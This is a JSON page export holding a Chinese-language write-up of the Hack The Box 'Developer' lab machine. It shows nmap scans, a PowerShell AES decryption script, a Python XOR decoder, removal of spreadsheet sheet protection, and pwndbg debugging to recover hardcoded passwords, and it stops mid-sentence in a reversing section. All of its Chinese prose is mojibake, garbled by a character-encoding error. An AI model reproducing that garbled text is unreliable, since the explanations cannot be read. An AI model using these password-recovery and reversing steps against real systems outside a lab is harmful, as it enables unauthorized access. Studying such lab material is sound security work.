{"pageProps":{"postData":{"id":"HackTheBoxMachine - Developer","contentHtml":"<h1>Machine - Developer</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Developer\">https://app.hackthebox.com/machines/Developer</a> | <code>Linux</code>Â |Â <code>Hard</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<pre><code class=\"hljs language-bash\">âœ  Developer nmap -sT -min-rate 5000 -p- 10.10.11.103\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:45 CST \nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.103\nHost is up (0.092s latency).\nNot shown: 59816 filtered tcp ports (no-response), 5717 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 110.48 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">âœ  Developer nmap -sT -A -p 22,80 10.10.11.103       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:48 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.103\nHost is up (0.23s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)\n|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)\n|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Did not follow redirect to http://developer.htb/\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   99.02 ms 10.10.16.1\n2   99.78 ms 10.10.11.103\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 18.70 seconds\n</code></pre>\n<p>è®¿é—® <code>HTTP</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image1.png\" alt=\"image.png\"></p>\n<p>å¯ä»¥åˆ›å»ºè´¦æˆ·ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ· <code>sunset</code> ï¼Œåˆ›å»ºå®Œæ¯•åä¼šç›´æ¥è¿›å…¥åå°</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image2.png\" alt=\"image.png\"></p>\n<p>é‡Œé¢ä¼šæœ‰ä¸€äº›CTFé¢˜ï¼Ÿè®©ä½ åšï¼Ÿ</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image3.png\" alt=\"image.png\"></p>\n<h2>CTF</h2>\n<h3>PES</h3>\n<p>é¢˜ç›®ä¼šç»™å‡ºä¸€ä¸ª<code>EXE</code>æ–‡ä»¶åˆä¸€ä¸²åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼š<code>X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC</code></p>\n<p>å¯¹ç¨‹åºè¿›è¡Œåç¼–è¯‘ï¼Œåœ¨<code>PS2EXE</code>ä¸­çš„<code>Main</code>ä¸­èƒ½æ‰¾åˆ°ä¸€ä¸²<code>base64</code>ç¼–ç åçš„å­—ç¬¦ä¸²</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image4.png\" alt=\"image.png\"></p>\n<p>è§£ç åæ˜¯åŠ å¯†çš„é€»è¾‘ï¼Œé€šè¿‡<code>AI</code>å†™å‡ºè§£å¯†è„šæœ¬å³å¯</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># ===================================================================</span>\n<span class=\"hljs-comment\"># Decryption Script for FullCrypto</span>\n<span class=\"hljs-comment\"># We are reversing the logic from the original Encrypt-String function</span>\n<span class=\"hljs-comment\"># ===================================================================</span>\n\n<span class=\"hljs-comment\"># åŠ è½½å¿…è¦çš„ç¨‹åºé›†</span>\n[void] [System.Reflection.Assembly]::LoadWithPartialName(<span class=\"hljs-string\">\"System.Security\"</span>)\nAdd-Type -AssemblyName System.Security\n\n<span class=\"hljs-keyword\">function</span> Decrypt-String(<span class=\"hljs-variable\">$base64String</span>) {\n    <span class=\"hljs-comment\"># --- è¿™äº›æ˜¯æˆ‘ä»¬åœ¨åŸè„šæœ¬ä¸­æ‰¾åˆ°çš„ç¡¬ç¼–ç ç§˜å¯† ---</span>\n    <span class=\"hljs-variable\">$Passphrase</span> = <span class=\"hljs-string\">\"AmazinglyStrongPassword\"</span>\n    <span class=\"hljs-variable\">$salt</span>       = <span class=\"hljs-string\">\"CrazilySimpleSalt\"</span>\n    <span class=\"hljs-variable\">$init</span>       = <span class=\"hljs-string\">\"StupidlyEasy_IV\"</span>\n    <span class=\"hljs-comment\"># ----------------------------------------------</span>\n\n    <span class=\"hljs-comment\"># 1. å‡†å¤‡ Rijndael (AES) å¯¹è±¡</span>\n    <span class=\"hljs-variable\">$r</span> = New-Object System.Security.Cryptography.RijndaelManaged\n\n    <span class=\"hljs-comment\"># 2. å‡†å¤‡å¯†ç å’Œç›å€¼çš„å­—èŠ‚æ•°ç»„ (å¿…é¡»å’ŒåŠ å¯†æ—¶å®Œå…¨ä¸€æ ·)</span>\n    <span class=\"hljs-variable\">$passBytes</span> = [System.Text.Encoding]::UTF8.GetBytes(<span class=\"hljs-variable\">$Passphrase</span>)\n    <span class=\"hljs-variable\">$saltBytes</span> = [System.Text.Encoding]::UTF8.GetBytes(<span class=\"hljs-variable\">$salt</span>)\n\n    <span class=\"hljs-comment\"># 3. ç”Ÿæˆå¯†é’¥ (å¿…é¡»å’ŒåŠ å¯†æ—¶å®Œå…¨ä¸€æ ·)</span>\n    <span class=\"hljs-comment\"># ä½¿ç”¨ PasswordDeriveBytes, SHA1, 5æ¬¡è¿­ä»£, ç”Ÿæˆ32å­—èŠ‚å¯†é’¥</span>\n    <span class=\"hljs-variable\">$r</span>.Key = (New-Object System.Security.Cryptography.PasswordDeriveBytes <span class=\"hljs-variable\">$passBytes</span>, <span class=\"hljs-variable\">$saltBytes</span>, <span class=\"hljs-string\">\"SHA1\"</span>, 5).GetBytes(32)\n\n    <span class=\"hljs-comment\"># 4. ç”Ÿæˆ IV (å¿…é¡»å’ŒåŠ å¯†æ—¶å®Œå…¨ä¸€æ ·)</span>\n    <span class=\"hljs-comment\"># è®¡ç®— IV ç§å­çš„ SHA1 å“ˆå¸Œï¼Œå¹¶å–å‰16ä¸ªå­—èŠ‚</span>\n    <span class=\"hljs-variable\">$r</span>.IV = (New-Object System.Security.Cryptography.SHA1Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes(<span class=\"hljs-variable\">$init</span>))[0..15]\n\n    <span class=\"hljs-comment\"># 5. ä» Base64 å­—ç¬¦ä¸²è§£ç å‡ºåŠ å¯†åçš„å­—èŠ‚æ•°ç»„</span>\n    try {\n        <span class=\"hljs-variable\">$encryptedBytes</span> = [System.Convert]::FromBase64String(<span class=\"hljs-variable\">$base64String</span>)\n    } catch {\n        Write-Error <span class=\"hljs-string\">\"Invalid Base64 string. Cannot decrypt.\"</span>\n        <span class=\"hljs-built_in\">return</span>\n    }\n\n    <span class=\"hljs-comment\"># 6. åˆ›å»ºè§£å¯†å™¨å¹¶æ‰§è¡Œè§£å¯†</span>\n    <span class=\"hljs-variable\">$c</span> = <span class=\"hljs-variable\">$r</span>.CreateDecryptor()\n    <span class=\"hljs-variable\">$ms</span> = New-Object System.IO.MemoryStream @(,<span class=\"hljs-variable\">$encryptedBytes</span>)\n    <span class=\"hljs-variable\">$cs</span> = New-Object System.Security.Cryptography.CryptoStream <span class=\"hljs-variable\">$ms</span>, <span class=\"hljs-variable\">$c</span>, <span class=\"hljs-string\">\"Read\"</span>\n    <span class=\"hljs-variable\">$sr</span> = New-Object System.IO.StreamReader <span class=\"hljs-variable\">$cs</span>\n\n    <span class=\"hljs-comment\"># 7. è¯»å–è§£å¯†åçš„æ˜æ–‡</span>\n    <span class=\"hljs-variable\">$decryptedString</span> = <span class=\"hljs-variable\">$sr</span>.ReadToEnd()\n\n    <span class=\"hljs-comment\"># 8. æ¸…ç†èµ„æºå¹¶è¿”å›ç»“æœ</span>\n    <span class=\"hljs-variable\">$sr</span>.Close()\n    <span class=\"hljs-variable\">$cs</span>.Close()\n    <span class=\"hljs-variable\">$ms</span>.Close()\n    <span class=\"hljs-variable\">$r</span>.Clear()\n\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-variable\">$decryptedString</span>\n}\n\n<span class=\"hljs-comment\"># --- ä½¿ç”¨æ–¹æ³• ---</span>\n<span class=\"hljs-comment\"># å°†ä½ åœ¨æŒ‘æˆ˜ä¸­å¾—åˆ°çš„åŠ å¯†å­—ç¬¦ä¸²æ›¿æ¢åˆ°ä¸‹é¢çš„å˜é‡ä¸­</span>\n<span class=\"hljs-variable\">$encryptedData</span> = <span class=\"hljs-string\">\"è¿™é‡Œæ”¾ä½ è¦è§£å¯†çš„Base64å­—ç¬¦ä¸²\"</span>\n\n<span class=\"hljs-comment\"># è°ƒç”¨è§£å¯†å‡½æ•°</span>\n<span class=\"hljs-variable\">$decryptedResult</span> = Decrypt-String -base64String <span class=\"hljs-variable\">$encryptedData</span>\n\n<span class=\"hljs-comment\"># è¾“å‡ºè§£å¯†ç»“æœ</span>\nWrite-Host <span class=\"hljs-string\">\"Decryption Result:\"</span> -ForegroundColor Green\nWrite-Host <span class=\"hljs-variable\">$decryptedResult</span>\n\n</code></pre>\n<pre><code class=\"hljs language-bash\">PS D:\\System\\Downloads\\20250620> .\\pass.ps1\nDecryption Result:\nDHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}\n</code></pre>\n<h3>Phished List</h3>\n<p>ç»™ä¸€ä¸ª<code>xlsx</code>æ–‡ä»¶ï¼Œå¬è¯´æ–‡æ¡£ä¸­åŒ…å«å¯†ç </p>\n<p>åƒæ˜¯éšå†™é¢˜ï¼Œä¸Šç½‘æœç´¢äº†ä¸‹ï¼Œ<code>docs</code>å’Œ<code>xlsx</code>åŸºæœ¬ä¸Šå°±æ˜¯<code>zip</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯¹å…¶è¿›è¡Œè§£å‹</p>\n<p>ç„¶åæ‰¾åˆ° <code>phished_credentials\\xl\\worksheets\\sheet1.xml</code> ,åœ¨æœ€åº•ä¸‹èƒ½æ‰¾åˆ°</p>\n<pre><code class=\"hljs language-bash\">&#x3C;sheetProtection \nalgorithmName=<span class=\"hljs-string\">\"SHA-512\"</span> \nhashValue=<span class=\"hljs-string\">\"Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==\"</span> \nsaltValue=<span class=\"hljs-string\">\"EoiHQklf0FagPs+iW0OzkA==\"</span> \nspinCount=<span class=\"hljs-string\">\"100000\"</span> \nsheet=<span class=\"hljs-string\">\"1\"</span> \nobjects=<span class=\"hljs-string\">\"1\"</span> \nscenarios=<span class=\"hljs-string\">\"1\"</span>/>\n</code></pre>\n<p>æˆ‘ä»¬å°† <code>sheet1.xml</code> çš„<code>sheetProtection</code> å—åˆ æ‰åï¼Œå†æ”¾è¿›å»æ›¿æ¢æ‰åŸæœ¬çš„ <code>sheet1.xml</code> å³å¯</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image5.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">DHTB{H1dD3N_C0LuMn5_FtW}\n</code></pre>\n<h3>Lucky Guess</h3>\n<p>å‹ç¼©åŒ…è§£å‹åæ˜¯ä¸€ä¸ªç¨‹åºï¼Œæˆ‘ä»¬ç›´æ¥<code>IDA</code>æ‰“å¼€</p>\n<p><code>winner</code>å‡½æ•°</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image6.png\" alt=\"image.png\"></p>\n<p><code>AI</code>ç¼–å†™å¼‚æˆ–è„šæœ¬</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># C ä»£ç ä¸­çš„å˜é‡</span>\nkey = <span class=\"hljs-string\">\"98hKjr3f8CgfF\"</span>\nciphertext = <span class=\"hljs-string\">\"^w!%-%z2p7/# uw?\"</span>\n\n<span class=\"hljs-comment\"># ç”¨äºå­˜æ”¾è§£å¯†ç»“æœçš„å˜é‡</span>\nplaintext = <span class=\"hljs-string\">\"\"</span>\n\n<span class=\"hljs-comment\"># éå†å¯†æ–‡ä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(len(ciphertext)):\n    <span class=\"hljs-comment\"># 1. å–å‡ºå¯†æ–‡å­—ç¬¦å’Œå¯¹åº”çš„å¯†é’¥å­—ç¬¦</span>\n    <span class=\"hljs-comment\">#    ä½¿ç”¨æ¨¡è¿ç®— (%) æ¥å®ç°å¯†é’¥çš„å¾ªç¯ä½¿ç”¨</span>\n    cipher_char = ciphertext[i]\n    key_char = key[i % len(key)]\n    \n    <span class=\"hljs-comment\"># 2. è¿›è¡Œå¼‚æˆ– (XOR) è¿ç®—</span>\n    <span class=\"hljs-comment\">#    ord() è·å–å­—ç¬¦çš„ASCIIç ï¼Œ^ æ˜¯å¼‚æˆ–æ“ä½œç¬¦</span>\n    decrypted_char_code = ord(cipher_char) ^ ord(key_char)\n    \n    <span class=\"hljs-comment\"># 3. åº”ç”¨ç‰¹æ®Šå¤„ç†è§„åˆ™</span>\n    <span class=\"hljs-keyword\">if</span> decrypted_char_code &#x3C;= 31:\n        decrypted_char_code += 32\n        \n    <span class=\"hljs-comment\"># 4. å°†è§£å¯†åçš„ASCIIç è½¬æ¢å›å­—ç¬¦ï¼Œå¹¶æ‹¼æ¥åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span>\n    <span class=\"hljs-comment\">#    chr() å°†ASCIIç è½¬ä¸ºå­—ç¬¦</span>\n    plaintext += chr(decrypted_char_code)\n\n<span class=\"hljs-comment\"># æŒ‰ç…§æ ¼å¼è¾“å‡ºæœ€ç»ˆçš„ Flag</span>\nflag = f<span class=\"hljs-string\">\"DHTB{{{plaintext}}}\"</span>\n<span class=\"hljs-built_in\">print</span>(flag)\n</code></pre>\n<pre><code class=\"hljs language-bash\">âœ  Developer python getpass.py                                              \nDHTB{gOInGWITHtHEfLOW}\n</code></pre>\n<h3>Authenication</h3>\n<p>I developed a new authentication mechanism using rust. Can you reverse my password?</p>\n<p><code>rust</code> é€†å‘</p>\n<pre><code class=\"hljs language-bash\">âœ  Developer ./authenticate                                    \nWelcome to TheCyberGeek<span class=\"hljs-string\">'s authentication platform\nEnter the password to proceed: \nsdadad\nYou are unauthorized to use this application!\nâœ  Developer file authenticate \nauthenticate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=95ac617025cf1bfe1e6749172a7888dfc4fe4dfe, for GNU/Linux 3.2.0, with debug_info, not stripped\n</span></code></pre>\n<p>è¿›å»è¦ä½ è¾“å…¥å¯†ç ç„¶åéªŒè¯ï¼Œ<code>IDA</code>æ‰“å¼€ï¼Œæ‰¾åˆ°éªŒè¯çš„éƒ¨åˆ†</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image7.png\" alt=\"image.png\"></p>\n<p>å…¶ä¸­çš„è¿™è¡Œä»£ç æ­£åœ¨æ‰§è¡ŒÂ <code>v3 == v5</code>Â çš„æ¯”è¾ƒï¼Œå¹¶æŠŠç»“æœï¼ˆ<code>true</code>Â æˆ–Â <code>false</code>ï¼‰å­˜èµ·æ¥</p>\n<pre><code class=\"hljs language-bash\">HIBYTE(v2.pieces.data_ptr) = core::cmp::impls::_$LT$impl$u20<span class=\"hljs-variable\">$core</span>..cmp..PartialEq$LT$$RF$B$GT$$u20$<span class=\"hljs-keyword\">for</span>$u20$$RF$A$GT$::eq::h372d5aaf05c06316(\n                                 &#x26;v3,\n                                 &#x26;v5);\n</code></pre>\n<p>å…¶ä¸­ä¸€ä¸ªåº”è¯¥æ˜¯ç”¨æˆ·è¾“å…¥çš„ï¼Œç„¶åå’Œ<code>v3</code> æˆ–è€… <code>v5</code> å»æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨<code>v3</code>æˆ–è€…<code>v5</code> å¤„æ–­ç‚¹ï¼Œå°±å¯ä»¥çœ‹åˆ°æ˜¯å’Œä»€ä¹ˆåœ¨å¯¹æ¯”</p>\n<pre><code class=\"hljs language-bash\">âœ  Developer pwndbg authenticate \nReading symbols from authenticate...\npwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] <span class=\"hljs-keyword\">for</span> a list.\npwndbg: created 13 GDB <span class=\"hljs-built_in\">functions</span> (can be used with <span class=\"hljs-built_in\">print</span>/break). Type <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">function</span> to see them.\n------- tip of the day (<span class=\"hljs-built_in\">disable</span> with <span class=\"hljs-built_in\">set</span> show-tips off) -------\nIf you want Pwndbg to clear screen on each <span class=\"hljs-built_in\">command</span> (but still save previous output <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">history</span>) use <span class=\"hljs-built_in\">set</span> context-clear-screen on\npwndbg> info <span class=\"hljs-built_in\">functions</span>\n...\n0x0000000000008e30  main::validate\n0x00000000000090f0  main::authenticated                                                                           \n0x0000000000009130  main::check_password                                                                          \n0x0000000000009240  main::main                 \n0x0000000000009360  main   \n...\npwndbg> disassemble 0x0000000000009130\n...\n   0x00000000000091af &#x3C;+127>:   mov    rcx,QWORD PTR [rsp+0x10]                                                   \n   0x00000000000091b4 &#x3C;+132>:   mov    QWORD PTR [rsp+0x60],rcx                                                   \n   0x00000000000091b9 &#x3C;+137>:   lea    rdi,[rsp+0x38]\n   0x00000000000091be &#x3C;+142>:   lea    rsi,[rsp+0x58]\n   0x00000000000091c3 &#x3C;+147>:   call   0x7a80 &#x3C;_ZN4core3cmp5impls69_$LT$impl$u20<span class=\"hljs-variable\">$core</span>..cmp..PartialEq$LT$$RF$B$GT$$u20$<span class=\"hljs-keyword\">for</span>$u20$$RF$A$GT<span class=\"hljs-variable\">$2eq17h372d5aaf05c06316E</span>>\n   0x00000000000091c8 &#x3C;+152>:   mov    BYTE PTR [rsp+0x7],al                                                      \n   0x00000000000091cc &#x3C;+156>:   jmp    0x91ce &#x3C;_ZN4main14check_password17h1ae7b2b87f21bd0aE+158>                  \n   0x00000000000091ce &#x3C;+158>:   lea    rdi,[rsp+0x40]  \n   0x00000000000091d3 &#x3C;+163>:   call   0x9db0 &#x3C;_ZN4core3ptr13drop_in_place17h5e2052686c20525eE>                   \n   0x00000000000091d8 &#x3C;+168>:   mov    al,BYTE PTR [rsp+0x7]                                                      \n   0x00000000000091dc &#x3C;+172>:   <span class=\"hljs-built_in\">test</span>   al,0x1 \n...\n</code></pre>\n<p><code>0x00000000000091c3</code> æ˜¯æˆ‘ä»¬æƒ³è¦æ–­ç‚¹çš„åœ°æ–¹ï¼Œä½†æ˜¯å¯èƒ½æœ‰<code>ALSR</code> ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥æ–­ç‚¹</p>\n<pre><code class=\"hljs language-bash\">pwndbg> b main\nBreakpoint 1 at 0x9360\npwndbg> r\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / <span class=\"hljs-built_in\">set</span> <span class=\"hljs-built_in\">emulate</span> on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n â–º 0x55555555d360 &#x3C;main>                                                                                          push   rax\n   0x55555555d361 &#x3C;main+1>                                                                                        movsxd rax, edi                 RAX => 1\n   0x55555555d364 &#x3C;main+4>                                                                                        lea    rdi, [rip - 0x12b]       RDI => 0x55555555d240 (main::main) â—‚â€” sub rsp, 0xb8\n   0x55555555d36b &#x3C;main+11>                                                                                       mov    qword ptr [rsp], rsi     [0x7fffffffdf40] &#x3C;= 0x7fffffffe058 â€”â–¸ 0x7fffffffe35d â—‚â€” <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/authenticate'</span>\n   0x55555555d36f &#x3C;main+15>                                                                                       mov    rsi, rax                 RSI => 1\n   0x55555555d372 &#x3C;main+18>                                                                                       mov    rdx, qword ptr [rsp]     RDX, [0x7fffffffdf40] => 0x7fffffffe058 â€”â–¸ 0x7fffffffe35d â—‚â€” <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/authenticate'</span>\n   0x55555555d376 &#x3C;main+22>                                                                                       call   std::rt::lang_start         &#x3C;std::rt::lang_start>\n \n   0x55555555d37b &#x3C;main+27>                                                                                       pop    rcx\n   0x55555555d37c &#x3C;main+28>                                                                                       ret    \n \n   0x55555555d37d                                                                                                 nop    dword ptr [rax]\n   0x55555555d380 &#x3C;&#x3C;<span class=\"hljs-string\">alloc::vec::Vec&#x3C;T> as alloc</span>::vec::SpecExtend&#x3C;&#x26;T,core::slice::iter::Iter&#x3C;T>>>::spec_extend>    sub    rsp, 0x28\n</code></pre>\n<p>èƒ½çœ‹åˆ°åœ°å€éƒ½å˜æˆäº†<code>0x55555555dxxx</code></p>\n<pre><code class=\"hljs language-bash\">0x555555554000 + 0x91c3 = 0x55555555d1c3\n</code></pre>\n<p>ç„¶åå†åœ¨<code>0x55555555d1c3</code>å¤„æ–­ç‚¹</p>\n<pre><code class=\"hljs language-bash\">pwndbg> b *0x55555555d1c3\nBreakpoint 2 at 0x55555555d1c3\npwndbg> c\nContinuing.\nWelcome to TheCyberGeek<span class=\"hljs-string\">'s authentication platform\nEnter the password to proceed: \nwhatï¼ˆéšä¾¿è¾“å…¥ï¼‰\n</span></code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image8.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image9.png\" alt=\"image.png\"></p>\n<p>å¯ä»¥çœ‹åˆ° <code>what</code>æ˜¯å’Œ<code>DHTB{rusty_bu5in3s5}</code> åœ¨æ¯”è¾ƒ</p>\n<pre><code class=\"hljs language-bash\">âœ  Developer ./authenticate\nWelcome to TheCyberGeek<span class=\"hljs-string\">'s authentication platform\nEnter the password to proceed: \nDHTB{rusty_bu5in3s5}\nYou have successfully authenticated!\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">DHTB{rusty_bu5in3s5}\n</code></pre>\n<h3>RevMe</h3>\n<p>ç›´æ¥å°±èƒ½æ‹¿åˆ° <code>flag</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image10.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">DHTB{TCG5_S1mPl3_R3v3r51nG_Ch4773nG3}\n</code></pre>\n<h3>PwnMe</h3>\n<p><code>PWN</code>é¢˜ç›®ï¼Œchecksecï¼Œ<code>NX</code>å’Œ<code>PIE</code>éƒ½å¼€äº†</p>\n<pre><code class=\"hljs language-bash\">âœ  Developer checksec pwnme  \n[*] Checking <span class=\"hljs-keyword\">for</span> new versions of pwntools\n    To <span class=\"hljs-built_in\">disable</span> this functionality, <span class=\"hljs-built_in\">set</span> the contents of /root/.cache/.pwntools-cache-3.13/update to <span class=\"hljs-string\">'never'</span> (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/pwnme'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n    Stripped:   No\n</code></pre>\n<p>ä½†æ˜¯è²Œä¼¼å¹¶ä¸ç”¨çœ‹è¿™ä¸ªï¼Œä¹Ÿåƒæ˜¯é€†å‘é¢˜ç›®ï¼Œä¸‹è¾¹æ˜¯<code>main</code>å‡½æ•°</p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char *v3; // rax\n  char s[8]; // [rsp+10h] [rbp-20h] BYREF\n  __int64 v6; // [rsp+18h] [rbp-18h]\n  int v7; // [rsp+20h] [rbp-10h]\n  char *v8; // [rsp+28h] [rbp-8h]\n\n  <span class=\"hljs-keyword\">if</span> ( argc > 1 )\n  {\n    <span class=\"hljs-keyword\">if</span> ( (unsigned int)check_password(argv[1], argv, envp) )\n    {\n      puts(<span class=\"hljs-string\">\"Password correct. Here's a flag:\"</span>);\n      *(_QWORD *)s = 0xC384B2CB92A49894LL;\n      v6 = 0x8796C283C680B381LL;\n      v7 = 13486015;\n      v8 = s;\n      <span class=\"hljs-keyword\">while</span> ( *v8 )\n      {\n        v3 = v8++;\n        *v3 -= 80;\n      }\n      puts(s);\n    }\n    <span class=\"hljs-keyword\">else</span>\n    {\n      puts(<span class=\"hljs-string\">\"Wrong password.\"</span>);\n    }\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    puts(<span class=\"hljs-string\">\"Please enter your password as a program argument!\"</span>);\n  }\n  <span class=\"hljs-built_in\">return</span> 0;\n}\n</code></pre>\n<p>ä¸»è¦åŠæ—¶è¦çœ‹<code>check_password</code></p>\n<pre><code class=\"hljs language-bash\">__int64 __fastcall check_password(const char *a1)\n{\n  char *v1; // rax\n  char v3[8]; // [rsp+13h] [rbp-3Dh] BYREF\n  char s2[16]; // [rsp+20h] [rbp-30h] BYREF\n  char dest[16]; // [rsp+30h] [rbp-20h] BYREF\n  char *v6; // [rsp+40h] [rbp-10h]\n  unsigned int v7; // [rsp+4Ch] [rbp-4h]\n\n  v7 = 0;\n  strcpy(v3, <span class=\"hljs-string\">\"é—¨èµ–æ—…æƒ«æ€ç·\"</span>);\n  v6 = v3;\n  <span class=\"hljs-keyword\">while</span> ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n  strcpy(dest, a1);\n  strcpy(s2, v3);\n  <span class=\"hljs-keyword\">if</span> ( !strcmp(dest, s2) )\n    <span class=\"hljs-built_in\">return</span> 1;\n  <span class=\"hljs-built_in\">return</span> v7;\n}\n</code></pre>\n<p><code>a1</code>æ˜¯æˆ‘ä»¬çš„é”®å…¥çš„å‚æ•°ï¼Œä¸»è¦çš„è§£å¯†é€»è¾‘æ˜¯åœ¨ï¼š</p>\n<pre><code class=\"hljs language-bash\">  <span class=\"hljs-keyword\">while</span> ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n</code></pre>\n<p>ç¨‹åºéå†è¿™ä¸ªç¥ç§˜å­—ç¬¦ä¸²ï¼ˆ<code>v3</code>ï¼‰çš„æ¯ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶å°†æ¯ä¸ªå­—èŠ‚çš„å€¼å‡å» <code>80</code></p>\n<p>ä½†æ˜¯æœ€åè¿˜æ˜¯ä¼šåœ¨<code>if ( !strcmp(dest, s2) )</code> å¤„è¿›è¡Œå¯¹æ¯”ï¼Œæˆ‘ä»¬è¿˜æ˜¯åœ¨é‚£æ–­ç‚¹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å¯„å­˜å™¨çš„å€¼</p>\n<p>æˆ‘ä»¬è¦åœ¨<code>0x00000000000011de</code> å¤„æ–­ç‚¹</p>\n<pre><code class=\"hljs language-bash\">0x00000000000011d8 &#x3C;+131>:   mov    rsi,rdx\n0x00000000000011db &#x3C;+134>:   mov    rdi,rax\n0x00000000000011de &#x3C;+137>:   call   0x1050 &#x3C;strcmp@plt>\n0x00000000000011e3 &#x3C;+142>:   <span class=\"hljs-built_in\">test</span>   eax,eax\n</code></pre>\n<p>å’Œä¹‹å‰ä¸€æ ·ï¼Œå› 